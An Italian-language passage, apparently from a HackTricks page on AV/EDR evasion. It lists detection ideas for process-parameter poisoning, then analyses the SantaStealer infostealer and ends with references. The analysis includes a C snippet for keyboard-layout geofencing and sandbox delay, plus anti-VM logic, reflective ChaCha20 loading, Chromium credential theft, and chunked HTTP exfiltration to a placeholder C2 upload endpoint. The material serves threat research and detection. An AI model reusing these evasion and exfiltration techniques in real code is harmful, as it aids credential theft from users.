### Idee per il rilevamento

Buone opportunità di threat hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri di processo**
- tale modifica dei permessi seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote di `PEB` e poi di `RTL_USER_PROCESS_PARAMETERS`
- valori insolitamente lunghi o ad alta entropia di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creazione del processo

### Note

- P3 è un **trucco di trasferimento tra processi**, non una primitiva di esecuzione completa: il parametro copiato richiede comunque una modifica dei permessi per l'esecuzione e un metodo di reindirizzamento dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato preso in considerazione dagli autori, ma poi scartato perché richiama internamente primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tecniche di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (noto anche come BluelineStealer) mostra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Filtro basato sul layout della tastiera e ritardo sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi che non si attivi mai nelle aree geografiche escluse e lasciando al contempo una traccia utile per il threat hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logica `check_antivm` a più livelli

- La variante A scorre l’elenco dei processi, calcola per ogni nome un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il calcolo del checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà di sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali intorno alle sleep per individuare l’esecuzione single-step. Qualsiasi rilevamento interrompe l’esecuzione prima dell’avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE primaria incorpora un helper per le credenziali di Chromium, che viene scritto su disco oppure mappato manualmente in memoria; in modalità fileless risolve autonomamente importazioni e rilocazioni, quindi non vengono scritti artefatti dell’helper.
- L’helper archivia una DLL di secondo stadio, cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective con direct syscall per iniettarsi in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittare password/cookie/carte di credito direttamente dai database SQLite, nonostante le protezioni ABE.

### Raccolta modulare in memoria ed esfiltrazione HTTP a blocchi

- `create_memory_based_log` scorre una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser ecc.). Ogni thread scrive i risultati in buffer condivisi e comunica il numero di file dopo un periodo di join di circa 45 s.
- Al termine, tutto viene compresso con la libreria `miniz`, linkata staticamente, come `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 s e invia l’archivio in streaming, in blocchi da 10 MB, tramite HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary `multipart/form-data` del browser (`----WebKitFormBoundary***`). Ogni blocco include `User-Agent: upload`, `auth: <build_id>` e, facoltativamente, `w: <campaign_tag>`; l’ultimo blocco aggiunge `complete: true` per indicare al C2 che il riassemblaggio è terminato.

## References

- [1] [Tecniche avanzate di evasione: precisione nello stomping dei moduli](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – articolo](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stack di chiamate: basta pass gratuiti per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC per lo spoofing dello stack di chiamate](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena di infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: esplorazione delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con la protezione Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Infrangere la barriera protettiva di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Dietro la pura facciata: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittazione di Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: contrastare il malware Node.js con il tracciamento delle API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La bella addormentata: mettere Adaptix a riposo con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La bella addormentata II: CFG, CET e spoofing dello stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento del sleep con Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il tuo Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni Red Team: una guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: trasformare il driver di remediation di Defender in una primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice di supporto MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creazione di funzioni auto-mascheranti con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
